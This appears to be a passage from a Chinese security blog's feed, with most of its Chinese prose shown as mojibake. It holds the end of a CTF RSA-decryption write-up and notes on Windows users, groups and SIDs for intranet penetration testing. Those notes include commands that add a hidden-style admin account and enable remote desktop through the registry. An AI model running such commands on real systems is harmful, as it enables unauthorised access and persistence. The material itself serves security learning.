class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">e=<span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">N=<span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">d=hack_RSA(e,N)</span><br><span class="line">m=pow(c,d,N)</span><br><span class="line">flag=a2b_hex(hex(m).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)).decode()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€åˆæ¢ä¹‹WindowsåŸºç¡€</title>
      <link href="2020/06/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/"/>
      <url>2020/06/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<p>è®°ä¸€ä¸‹ï¼Œå¿˜äº†æ–¹ä¾¿çœ‹ï¼ï¼ï¼</p><a id="more"></a><h2 id="Windowsç”¨æˆ·å’Œç”¨æˆ·ç»„"><a href="#Windowsç”¨æˆ·å’Œç”¨æˆ·ç»„" class="headerlink" title="Windowsç”¨æˆ·å’Œç”¨æˆ·ç»„"></a>Windowsç”¨æˆ·å’Œç”¨æˆ·ç»„</h2><h3 id="å¸¸è§ç”¨æˆ·"><a href="#å¸¸è§ç”¨æˆ·" class="headerlink" title="å¸¸è§ç”¨æˆ·"></a>å¸¸è§ç”¨æˆ·</h3><h4 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h4><p>ç³»ç»Ÿç®¡ç†å‘˜ï¼Œè®¡ç®—æœºçš„ç®¡ç†å‘˜è´¦æˆ·æ‹¥æœ‰å¯¹å…¨ç³»ç»Ÿçš„æ§åˆ¶æƒï¼Œèƒ½æ”¹å˜ç³»ç»Ÿè®¾ç½®ï¼Œå¯ä»¥å®‰è£…å’Œåˆ é™¤ç¨‹åºï¼Œèƒ½è®¿é—®è®¡ç®—æœºä¸Šæ‰€æœ‰çš„æ–‡ä»¶ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå®ƒè¿˜æ‹¥æœ‰æ§åˆ¶å…¶ä»–ç”¨æˆ·çš„æƒé™ã€‚Windows7ä¸­è‡³å°‘è¦æœ‰ä¸€ä¸ªè®¡ç®—æœºç®¡ç†å‘˜è´¦æˆ·ã€‚åœ¨åªæœ‰ä¸€ä¸ªè®¡ç®—æœºç®¡ç†å‘˜è´¦æˆ·çš„æƒ…å†µä¸‹ï¼Œè¯¥è´¦æˆ·ä¸èƒ½å°†è‡ªå·±æ”¹æˆå—é™åˆ¶è´¦æˆ·ã€‚</p><h4 id="User"><a href="#User" class="headerlink" title="User"></a>User</h4><p>æ ‡å‡†ç”¨æˆ·è´¦æˆ·æ˜¯å—åˆ°ä¸€å®šé™åˆ¶çš„è´¦æˆ·ï¼Œåœ¨ç³»ç»Ÿä¸­å¯ä»¥åˆ›å»ºå¤šä¸ªæ­¤ç±»è´¦æˆ·ï¼Œä¹Ÿå¯ä»¥æ”¹å˜å…¶è´¦æˆ·ç±»å‹ã€‚è¯¥è´¦æˆ·å¯ä»¥è®¿é—®å·²ç»å®‰è£…åœ¨è®¡ç®—æœºä¸Šçš„ç¨‹åºï¼Œå¯ä»¥è®¾ç½®è‡ªå·±è´¦æˆ·çš„å›¾ç‰‡ã€å¯†ç ç­‰ï¼Œä½†æ— æƒæ›´æ”¹å¤§å¤šæ•°è®¡ç®—æœºçš„è®¾ç½®ã€‚</p><h4 id="System"><a href="#System" class="headerlink" title="System"></a>System</h4><p>SYSTEMæ˜¯ç³»ç»Ÿä¿ç•™æ‹¥æœ‰æœ€é«˜æƒé™çš„è¶…çº§ç®¡ç†å‘˜å¸æˆ·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨ç™»å½•å¯¹è¯æ¡†ä¸Šä»¥SYSTEMå¸æˆ·çš„èº«ä»½ç™»å½•åˆ°Windowsæ¡Œé¢ç¯å¢ƒã€‚</p><h3 id="ç”¨æˆ·ç»„"><a href="#ç”¨æˆ·ç»„" class="headerlink" title="ç”¨æˆ·ç»„"></a>ç”¨æˆ·ç»„</h3><h4 id="åŸºæœ¬ç”¨æˆ·ç»„"><a href="#åŸºæœ¬ç”¨æˆ·ç»„" class="headerlink" title="åŸºæœ¬ç”¨æˆ·ç»„"></a>åŸºæœ¬ç”¨æˆ·ç»„</h4><p><strong>Administrators</strong></p><p>ã€€ã€€å±äºè¯¥administatorsæœ¬åœ°ç»„å†…çš„ç”¨æˆ·ï¼Œéƒ½å…·å¤‡ç³»ç»Ÿç®¡ç†å‘˜çš„æƒé™ï¼Œå®ƒä»¬æ‹¥æœ‰å¯¹è¿™å°è®¡ç®—æœºæœ€å¤§çš„æ§åˆ¶æƒé™ï¼Œå¯ä»¥æ‰§è¡Œæ•´å°è®¡ç®—æœºçš„ç®¡ç†ä»»åŠ¡ã€‚å†…ç½®çš„ç³»ç»Ÿç®¡ç†å‘˜è´¦å·Administratorå°±æ˜¯æœ¬åœ°ç»„çš„æˆå‘˜ï¼Œè€Œä¸”æ— æ³•å°†å®ƒä»è¯¥ç»„åˆ é™¤ã€‚</p><p>ã€€ã€€å¦‚æœè¿™å°è®¡ç®—æœºå·²åŠ å…¥åŸŸï¼Œåˆ™åŸŸçš„Domain Adminsä¼šè‡ªåŠ¨åœ°åŠ å…¥åˆ°è¯¥è®¡ç®—æœºçš„Administratorsç»„å†…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸŸä¸Šçš„ç³»ç»Ÿç®¡ç†å‘˜åœ¨è¿™å°è®¡ç®—æœºä¸Šä¹Ÿå…·å¤‡ç€ç³»ç»Ÿç®¡ç†å‘˜çš„æƒé™ã€‚</p><p><strong>Backup OPerators</strong></p><p>ã€€ã€€åœ¨è¯¥ç»„å†…çš„æˆå‘˜ï¼Œä¸è®ºå®ƒä»¬æ˜¯å¦æœ‰æƒè®¿é—®è¿™å°è®¡ç®—æœºä¸­çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶ï¼Œéƒ½å¯ä»¥é€šè¿‡â€œå¼€å§‹â€ï¼â€œæ‰€æœ‰ç¨‹åºâ€ï¼â€œé™„ä»¶â€ï¼â€œç³»ç»Ÿå·¥å…·â€ï¼â€œå¤‡ä»½â€çš„é€”å¾„ï¼Œå¤‡ä»½ä¸è¿˜åŸè¿™äº›æ–‡ä»¶å¤¹ä¸æ–‡ä»¶ã€‚</p><p><strong>Guests</strong></p><p>ã€€ã€€è¯¥ç»„æ˜¯æä¾›æ²¡æœ‰ç”¨æˆ·å¸æˆ·ï¼Œä½†æ˜¯éœ€è¦è®¿é—®æœ¬åœ°è®¡ç®—æœºå†…èµ„æºçš„ç”¨æˆ·ä½¿ç”¨ï¼Œè¯¥ç»„çš„æˆå‘˜æ— æ³•æ°¸ä¹…åœ°æ”¹å˜å…¶æ¡Œé¢çš„å·¥ä½œç¯å¢ƒã€‚è¯¥ç»„æœ€å¸¸è§çš„é»˜è®¤æˆå‘˜ä¸ºç”¨æˆ·å¸å·Guestã€‚</p><p><strong>Network Configuration Operators</strong></p><p>ã€€ã€€è¯¥ç»„å†…çš„ç”¨æˆ·å¯ä»¥åœ¨å®¢æˆ·ç«¯æ‰§è¡Œä¸€èˆ¬çš„ç½‘ç»œè®¾ç½®ä»»åŠ¡ï¼Œä¾‹å¦‚æ›´æ”¹IPåœ°å€ï¼Œä½†æ˜¯ä¸å¯ä»¥å®‰è£…/åˆ é™¤é©±åŠ¨ç¨‹åºä¸æœåŠ¡ï¼Œä¹Ÿä¸å¯ä»¥æ‰§è¡Œä¸ç½‘ç»œæœåŠ¡å™¨è®¾ç½®æœ‰å…³çš„ä»»åŠ¡ï¼Œä¾‹å¦‚DNSæœåŠ¡å™¨ã€DHCPæœåŠ¡å™¨çš„è®¾ç½®ã€‚</p><p><strong>Power Users</strong></p><p>ã€€ã€€è¯¥ç»„å†…çš„ç”¨æˆ·å…·å¤‡æ¯”Usersç»„æ›´å¤šçš„æƒåˆ©ï¼Œä½†æ˜¯æ¯”Administratorsç»„æ‹¥æœ‰çš„æƒåˆ©æ›´å°‘ä¸€äº›ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥ï¼š</p><p>ã€€ã€€åˆ›å»ºã€åˆ é™¤ã€æ›´æ”¹æœ¬åœ°ç”¨æˆ·å¸æˆ·</p><p>ã€€ã€€åˆ›å»ºã€åˆ é™¤ã€ç®¡ç†æœ¬åœ°è®¡ç®—æœºå†…çš„å…±äº«æ–‡ä»¶å¤¹ä¸å…±äº«æ‰“å°æœº</p><p>ã€€ã€€è‡ªå®šä¹‰ç³»ç»Ÿè®¾ç½®ï¼Œä¾‹å¦‚æ›´æ”¹è®¡ç®—æœºæ—¶é—´ã€å…³é—­è®¡ç®—æœºç­‰</p><p>ã€€ã€€ä½†æ˜¯ä¸å¯ä»¥æ›´æ”¹Administratorsä¸Backup Operatorsã€æ— æ³•å¤ºå–æ–‡ä»¶çš„æ‰€æœ‰æƒã€æ— æ³•å¤‡ä»½ä¸è¿˜åŸæ–‡ä»¶ã€æ— æ³•å®‰è£…åˆ é™¤ä¸åˆ é™¤è®¾å¤‡é©±åŠ¨ç¨‹åºã€æ— æ³•ç®¡ç†å®‰å…¨ä¸å®¡æ ¸æ—¥å¿—ã€‚</p><p><strong>Remote Desktop Users</strong></p><p>ã€€ã€€è¯¥ç»„çš„æˆå‘˜å¯ä»¥é€šè¿‡è¿œç¨‹è®¡ç®—æœºç™»å½•ï¼Œä¾‹å¦‚ï¼Œåˆ©ç”¨ç»ˆç«¯æœåŠ¡å™¨ä»è¿œç¨‹è®¡ç®—æœºç™»å½•ã€‚</p><p><strong>Users</strong></p><p>ã€€ã€€è¯¥ç»„å‘˜åªæ‹¥æœ‰ä¸€äº›åŸºæœ¬çš„æƒåˆ©ï¼Œä¾‹å¦‚è¿è¡Œåº”ç”¨ç¨‹åºï¼Œä½†æ˜¯ä»–ä»¬ä¸èƒ½ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®ã€ä¸èƒ½æ›´æ”¹å…¶å®ƒç”¨æˆ·çš„æ•°æ®ã€ä¸èƒ½å…³é—­æœåŠ¡å™¨çº§çš„è®¡ç®—æœºã€‚</p><p>ã€€ã€€æ‰€æœ‰æ·»åŠ çš„æœ¬åœ°ç”¨æˆ·å¸æˆ·è€…è‡ªåŠ¨å±äºè¯¥ç»„ã€‚å¦‚æœè¿™å°è®¡ç®—æœºå·²ç»åŠ å…¥åŸŸï¼Œåˆ™åŸŸçš„Domain Usersä¼šè‡ªåŠ¨åœ°è¢«åŠ å…¥åˆ°è¯¥è®¡ç®—æœºçš„Usersç»„ä¸­ã€‚</p><p><strong>SYSTEM</strong></p><p>â€‹        æ‹¥æœ‰å’ŒAdministratorsä¸€æ ·ã€ç”šè‡³æ¯”å…¶è¿˜é«˜çš„æƒé™ï¼Œä½†æ˜¯è¿™ä¸ªç»„ä¸å…è®¸ä»»ä½•ç”¨æˆ·çš„åŠ å…¥ï¼Œåœ¨å¯Ÿçœ‹ç”¨æˆ·ç»„çš„æ—¶å€™ï¼Œå®ƒä¹Ÿä¸ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ï¼Œå®ƒå°±æ˜¯SYSTEMç»„ã€‚ç³»ç»Ÿå’Œç³»ç»Ÿçº§çš„æœåŠ¡æ­£å¸¸è¿è¡Œæ‰€éœ€è¦çš„æƒé™éƒ½æ˜¯é å®ƒèµ‹äºˆçš„ã€‚ç”±äºè¯¥ç»„åªæœ‰è¿™ä¸€ä¸ªç”¨æˆ·SYSTEMï¼Œå¯ä»¥ç†è§£æˆlinuxçš„rootç”¨æˆ·</p><h4 id="å†…ç½®ç‰¹æ®Šç»„"><a href="#å†…ç½®ç‰¹æ®Šç»„" class="headerlink" title="å†…ç½®ç‰¹æ®Šç»„"></a>å†…ç½®ç‰¹æ®Šç»„</h4><p><strong>Everone</strong></p><p>ã€€ã€€ä»»ä½•ä¸€ä¸ªç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚æ³¨æ„ï¼Œå¦‚æœGuestå¸å·è¢«å¯ç”¨æ—¶ï¼Œåˆ™ç»™Everoneè¿™ä¸ªç»„æŒ‡æ´¾æƒé™æ—¶å¿…é¡»å°å¿ƒï¼Œå› ä¸ºå½“ä¸€ä¸ªæ²¡æœ‰å¸æˆ·çš„ç”¨æˆ·è¿æ¥è®¡ç®—æœºæ—¶ï¼Œä»–è¢«å…è®¸è‡ªåŠ¨åˆ©ç”¨Guestå¸æˆ·è¿æ¥ï¼Œä½†æ˜¯å› ä¸ºGuestä¹Ÿæ˜¯å±äºEveroneç»„ï¼Œæ‰€ä»¥ä»–å°†å…·å¤‡Everyoneæ‰€æ‹¥æœ‰çš„æƒé™ã€‚</p><p><strong>Authenticated Users</strong></p><p>ã€€ã€€ä»»ä½•ä¸€ä¸ªåˆ©ç”¨æœ‰æ•ˆçš„ç”¨æˆ·å¸æˆ·è¿æ¥çš„ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚å»ºè®®åœ¨è®¾ç½®æƒé™æ—¶ï¼Œå°½é‡é’ˆå¯¹Authenticated Usersç»„è¿›è¡Œè®¾ç½®ï¼Œè€Œä¸è¦é’ˆå¯¹Everoneè¿›è¡Œè®¾ç½®ã€‚</p><p><strong>Interactive</strong></p><p>ã€€ã€€ä»»ä½•åœ¨æœ¬åœ°ç™»å½•çš„ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚</p><p><strong>Network</strong></p><p>ã€€ã€€ä»»ä½•é€šè¿‡ç½‘ç»œè¿æ¥æ­¤è®¡ç®—æœºçš„ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚</p><p><strong>Creator Owner</strong></p><p>ã€€ã€€æ–‡ä»¶å¤¹ã€æ–‡ä»¶æˆ–æ‰“å°æ–‡ä»¶ç­‰èµ„æºçš„åˆ›å»ºè€…ï¼Œå°±æ˜¯è¯¥èµ„æºçš„Creator Ownerï¼ˆåˆ›å»ºæ‰€æœ‰è€…ï¼‰ã€‚ä¸è¿‡ï¼Œå¦‚æœåˆ›å»ºè€…æ˜¯å±äºAdministratorsç»„å†…çš„æˆå‘˜ï¼Œåˆ™å…¶Creator Ownerä¸ºAdministratorsç»„ã€‚</p><p><strong>Anonymous Logon</strong></p><p>ã€€ã€€ä»»ä½•æœªåˆ©ç”¨æœ‰æ•ˆçš„Windows Server 2003å¸æˆ·è¿æ¥çš„ç”¨æˆ·ï¼Œéƒ½å±äºè¿™ä¸ªç»„ã€‚æ³¨æ„ï¼Œåœ¨windows 2003å†…ï¼ŒEverone ç»„å†…å¹¶ä¸åŒ…å«â€œAnonymous Logonâ€ç»„</p><h3 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h3><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>SIDä¹Ÿå°±æ˜¯å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSecurity Identifiersï¼‰ï¼Œæ˜¯æ ‡è¯†ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºå¸æˆ·çš„å”¯ä¸€çš„å·ç ã€‚åœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºè¯¥å¸æˆ·æ—¶ï¼Œå°†ç»™ç½‘ç»œä¸Šçš„æ¯ä¸€ä¸ªå¸æˆ·å‘å¸ƒä¸€ä¸ªå”¯ä¸€çš„ SIDã€‚Windows 2000 ä¸­çš„å†…éƒ¨è¿›ç¨‹å°†å¼•ç”¨å¸æˆ·çš„ SID è€Œä¸æ˜¯å¸æˆ·çš„ç”¨æˆ·æˆ–ç»„åã€‚å¦‚æœåˆ›å»ºå¸æˆ·ï¼Œå†åˆ é™¤å¸æˆ·ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„ç”¨æˆ·ååˆ›å»ºå¦ä¸€ä¸ªå¸æˆ·ï¼Œåˆ™æ–°å¸æˆ·å°†ä¸å…·æœ‰æˆæƒç»™å‰ä¸€ä¸ªå¸æˆ·çš„æƒåŠ›æˆ–æƒé™ï¼ŒåŸå› æ˜¯è¯¥å¸æˆ·å…·æœ‰ä¸åŒçš„ SID å·ã€‚å®‰å…¨æ ‡è¯†ç¬¦ä¹Ÿè¢«ç§°ä¸ºå®‰å…¨ ID æˆ– SIDã€‚</p><h4 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>ç”¨æˆ·é€šè¿‡éªŒè¯åï¼Œç™»é™†è¿›ç¨‹ä¼šç»™ç”¨æˆ·ä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼Œè¯¥ä»¤ç‰Œç›¸å½“äºç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºçš„ç¥¨è¯ï¼Œå½“ç”¨æˆ·è¯•å›¾è®¿é—®ç³»ç»Ÿèµ„æºæ—¶ï¼Œå°†è®¿é—®ä»¤ç‰Œæä¾›ç»™ Windows NTï¼Œç„¶å Windows NT æ£€æŸ¥ç”¨æˆ·è¯•å›¾è®¿é—®å¯¹è±¡ä¸Šçš„è®¿é—®æ§åˆ¶åˆ—è¡¨ã€‚å¦‚æœç”¨æˆ·è¢«å…è®¸è®¿é—®è¯¥å¯¹è±¡ï¼ŒWindows NTå°†ä¼šåˆ†é…ç»™ç”¨æˆ·é€‚å½“çš„è®¿é—®æƒé™ã€‚</p><p>è®¿é—®ä»¤ç‰Œæ˜¯ç”¨æˆ·åœ¨é€šè¿‡éªŒè¯çš„æ—¶å€™æœ‰ç™»é™†è¿›ç¨‹æ‰€æä¾›çš„ï¼Œæ‰€ä»¥æ”¹å˜ç”¨æˆ·çš„æƒé™éœ€è¦æ³¨é”€åé‡æ–°ç™»é™†ï¼Œé‡æ–°è·å–è®¿é—®ä»¤ç‰Œã€‚</p><h4 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h4><p>å¦‚æœå­˜åœ¨ä¸¤ä¸ªåŒæ ·SIDçš„ç”¨æˆ·ï¼Œè¿™ä¸¤ä¸ªå¸æˆ·å°†è¢«é‰´åˆ«ä¸ºåŒä¸€ä¸ªå¸æˆ·ï¼ŒåŸç†ä¸Šå¦‚æœå¸æˆ·æ— é™åˆ¶å¢åŠ çš„æ—¶å€™ï¼Œä¼šäº§ç”ŸåŒæ ·çš„SIDï¼Œåœ¨é€šå¸¸çš„æƒ…å†µä¸‹SIDæ˜¯å”¯ä¸€çš„ï¼Œä»–ç”±è®¡ç®—æœºåã€å½“å‰æ—¶é—´ã€å½“å‰ç”¨æˆ·æ€çº¿ç¨‹çš„CPUè€—è´¹æ—¶é—´çš„æ€»å’Œä¸‰ä¸ªå‚æ•°å†³å®šä»¥ä¿è¯å®ƒçš„å”¯ä¸€æ€§ã€‚</p><p>ä¸€ä¸ªå®Œæ•´çš„SIDåŒ…æ‹¬ï¼š</p><ul><li>ç”¨æˆ·å’Œç»„çš„å®‰å…¨æè¿°</li><li>48-bitçš„ID authority</li><li>ä¿®è®¢ç‰ˆæœ¬</li><li>å¯å˜çš„éªŒè¯å€¼Variable sub-authority values</li></ul><p>ä¾‹ï¼š<code>S-1-5-21-310440588-250036847-580389505-500</code></p><p>æˆ‘ä»¬æ¥å…ˆåˆ†æè¿™ä¸ªé‡è¦çš„SIDã€‚ç¬¬ä¸€é¡¹Sè¡¨ç¤ºè¯¥å­—ç¬¦ä¸²æ˜¯SIDï¼›ç¬¬äºŒé¡¹æ˜¯SIDçš„ç‰ˆæœ¬å·ï¼Œå¯¹äº2000æ¥è¯´ï¼Œè¿™ä¸ªå°±æ˜¯1ï¼›ç„¶åæ˜¯æ ‡å¿—ç¬¦çš„é¢å‘æœºæ„ï¼ˆidentifier authorityï¼‰ï¼Œå¯¹äº2000å†…çš„å¸æˆ·ï¼Œé¢å‘æœºæ„å°±æ˜¯NTï¼Œå€¼æ˜¯5ã€‚ç„¶åè¡¨ç¤ºä¸€ç³»åˆ—çš„å­é¢å‘æœºæ„ï¼Œå‰é¢å‡ é¡¹æ˜¯æ ‡å¿—åŸŸçš„ï¼Œæœ€åä¸€ä¸ªæ ‡å¿—ç€åŸŸå†…çš„å¸æˆ·å’Œç»„ã€‚</p><h4 id="SIDçš„è·å¾—"><a href="#SIDçš„è·å¾—" class="headerlink" title="SIDçš„è·å¾—"></a>SIDçš„è·å¾—</h4><p>å¼€å§‹ï¼è¿è¡Œï¼regedt32ï¼<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Builtin\Aliases\Members</code>ï¼Œæ‰¾åˆ°æœ¬åœ°çš„åŸŸçš„ä»£ç ï¼Œå±•å¼€åï¼Œå¾—åˆ°çš„å°±æ˜¯æœ¬åœ°å¸å·çš„æ‰€æœ‰SIDåˆ—è¡¨ã€‚</p><p>å…¶ä¸­å¾ˆå¤šå€¼éƒ½æ˜¯å›ºå®šçš„ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ª000001F4ï¼ˆ16è¿›åˆ¶ï¼‰ï¼Œæ¢ç®—æˆåè¿›åˆ¶æ˜¯500ï¼Œè¯´æ˜æ˜¯ç³»ç»Ÿå»ºç«‹çš„å†…ç½®ç®¡ç†å‘˜å¸å·administratorï¼Œ000001F5æ¢ç®—æˆ10è¿›åˆ¶æ˜¯501ï¼Œä¹Ÿå°±æ˜¯GUESTå¸å·äº†ï¼Œè¯¦ç»†çš„å‚ç…§åé¢çš„åˆ—è¡¨ã€‚</p><p>è¿™ä¸€é¡¹é»˜è®¤æ˜¯systemå¯ä»¥å®Œå…¨æ§åˆ¶ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦è·å¾—è¿™ä¸ªéœ€è¦ä¸€ä¸ªSystemçš„Cmdçš„Shellçš„åŸå› äº†ï¼Œå½“ç„¶å¦‚æœæƒé™è¶³å¤Ÿçš„è¯ä½ å¯ä»¥æŠŠä½ è¦æ·»åŠ çš„å¸å·æ·»åŠ è¿›å»ã€‚</p><p>æˆ–è€…ä½¿ç”¨Support Toolsçš„Regå·¥å…·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è·å¾—SIDå’Œç”¨æˆ·åç§°çš„å¯¹åº”å…³ç³»ï¼š</p><ol><li>Regedt32:<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \ProfileList</code></li><li>è¿™ä¸ªæ—¶å€™å¯ä»¥åœ¨å·¦ä¾§çš„çª—å£çœ‹åˆ°SIDçš„å€¼ï¼Œå¯ä»¥åœ¨å³ä¾§çš„çª—å£ä¸­ProfileImagePathçœ‹åˆ°ä¸åŒçš„SIDå…³è”çš„ç”¨æˆ·åï¼Œ<br>æ¯”å¦‚<code>%SystemDrive%\Documents and Settings\Administrator.momo</code>è¿™ä¸ªå¯¹åº”çš„å°±æ˜¯æœ¬åœ°æœºå™¨çš„ç®¡ç†å‘˜SID<br><code>%SystemDrive%\Documents and Settings\Administrator.domain</code>è¿™ä¸ªå°±æ˜¯å¯¹åº”åŸŸçš„ç®¡ç†å‘˜çš„å¸æˆ·</li></ol><p>å¦å¤–å¾®è½¯çš„ResourceKité‡Œé¢ä¹Ÿæä¾›äº†å·¥å…·getsidï¼Œsysinternalsçš„å·¥å…·åŒ…é‡Œé¢ä¹Ÿæœ‰Psgetsidï¼Œå…¶å®æ„Ÿè§‰åŸç†éƒ½æ˜¯è¯»å–æ³¨å†Œè¡¨çš„å€¼ç½¢äº†ï¼Œå°±æ˜¯çœäº†ä¸€äº›äº‹æƒ…ã€‚</p><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">net user# æŸ¥çœ‹ç”¨æˆ·</span><br><span class="line">net user Administrator# æŸ¥çœ‹administratorç”¨æˆ·è¯¦ç»†ä¿¡æ¯</span><br><span class="line">net user moonback 1314 /add# æ·»åŠ ç”¨æˆ·åmoonbackå¯†ç ä¸º1314çš„ç”¨æˆ·ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™(æ³¨æ„å¯†ç å¤æ‚åº¦)</span><br><span class="line">net user moonback /delete# åˆ é™¤moonbackç”¨æˆ·</span><br><span class="line">net user moonback /active:no# ç¦ç”¨moonbackç”¨æˆ·</span><br><span class="line">net user moonback /active:yes# å¯ç”¨moonbackç”¨æˆ·</span><br><span class="line">net user moonback /passwordchg:yes# ç”¨æˆ·moonbackå¯ä»¥æ”¹å˜å¯†ç </span><br><span class="line">net user moonback /passwordreq:yes# ç”¨æˆ·moonbackå¿…é¡»æ‹¥æœ‰å¯†ç </span><br><span class="line">net user moonback /expires:never# ç”¨æˆ·moonbackæ°¸ä¸è¿‡æœŸ</span><br><span class="line">net localgroup# æŸ¥çœ‹ç”¨æˆ·ç»„</span><br><span class="line">net localgroup Administrators# æŸ¥çœ‹ç®¡ç†å‘˜ç»„æˆå‘˜</span><br><span class="line">net localgroup Administrators moonback /del # å°†moonbackç”¨æˆ·ä»ç®¡ç†å‘˜ç»„åˆ é™¤</span><br><span class="line">net localgroup Administrators moonback /add # å°†moonbackç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„</span><br><span class="line">net localgroup hack /add # æ·»åŠ hackç”¨æˆ·ç»„</span><br><span class="line">whoami /user# æŸ¥çœ‹SID</span><br><span class="line">query user# æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</span><br><span class="line">tasklist# æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">tasklist /svc# æŸ¥çœ‹è¿›ç¨‹åŠå¯¹åº”çš„pidå’ŒæœåŠ¡</span><br><span class="line">tasklist /svc | findstr &quot;TeamService.exe&quot;# æŸ¥çœ‹è¿œç¨‹æ¡Œé¢è¿›ç¨‹</span><br><span class="line">taskkill /f /im pid# å¼ºåˆ¶æ€æ­»pidå·è¿›ç¨‹</span><br><span class="line">netstat -ano# æ˜¾ç¤ºç½‘ç»œä¿¡æ¯</span><br><span class="line">netstat -ano | findstr &quot;3389&quot;# æŸ¥çœ‹3389ç«¯å£çŠ¶æ€</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  # å¼€å¯3389</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f  # å…³é—­3389</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹è¿œç¨‹æ¡Œé¢ç«¯å£</span></span><br><span class="line">ver# æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼Œ5.1=&gt;2003 5.2=&gt;xp 6.1=&gt;win7ã€2008 6.2=&gt;win8ã€2012 10=&gt;win10</span><br><span class="line">systeminfo# æŸ¥çœ‹windowsè¯¦ç»†ä¿¡æ¯</span><br></pre></td></tr></table></figure><h2 id="Windowsè®¤è¯åŠå¯†ç "><a href="#Windowsè®¤è¯åŠå¯†ç " class="headerlink" title="Windowsè®¤è¯åŠå¯†ç "></a>Windowsè®¤è¯åŠå¯†ç </h2><h2 id="Windowsé˜²æŠ¤æ–¹æ¡ˆ"><a href="#Windowsé˜²æŠ¤æ–¹æ¡ˆ" class="headerlink" title="Windowsé˜²æŠ¤æ–¹æ¡ˆ"></a>Windowsé˜²æŠ¤æ–¹æ¡ˆ</h2><h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><p>Windows Vista å¼€å§‹å¼•å…¥äº† UAC(User Account 